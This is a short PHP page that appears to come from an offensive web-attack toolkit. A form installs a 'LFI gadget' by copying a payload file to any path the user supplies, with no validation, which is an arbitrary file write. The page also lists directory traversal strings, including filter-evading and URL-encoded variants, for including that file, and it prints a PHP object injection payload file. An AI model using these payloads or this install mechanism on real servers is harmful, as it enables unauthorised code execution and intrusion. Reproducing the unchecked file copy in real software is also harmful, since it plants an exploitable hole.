<?php

require_once 'inc/loader.php';
require_once 'inc/code.php';

$action = '';
if (isset($_REQUEST['lfi_path'])) {
    copy('./payloads/lfi.php', $_REQUEST['lfi_path']);
}

?>

<h1>LFI</h1>
<p>Install a LFI gadget to specific path</p>
<form action="" method="post">
    <div class="form-group">
        <input type="text" value="/tmp/lfi.php" name="lfi_path" placeholder="Path">
        <input class="btn btn-success" type="submit" value="Install" name="submit">
    </div>
</form>

<p>
<pre>
<code>
../../../../../../../../../../../../../../../../../../../tmp/lfi.php
..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././tmp/lfi.php
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Flfi.php
</code>
</pre>
</p>

<h1>PHP Object Injection</h1>
<p></p>
<?php
if (class_exists('ObjInjec')) {
    // The ObjInjec class is defined, you can use it
    echo "ObjInjec class is defined.";
} else {
    // The ObjInjec class is not defined
    echo "ObjInjec class is not defined.";
}
print_code(file_get_contents('payloads/php_obj.php'));
?>

<pre>
<code>
TODO
</code>
</pre>

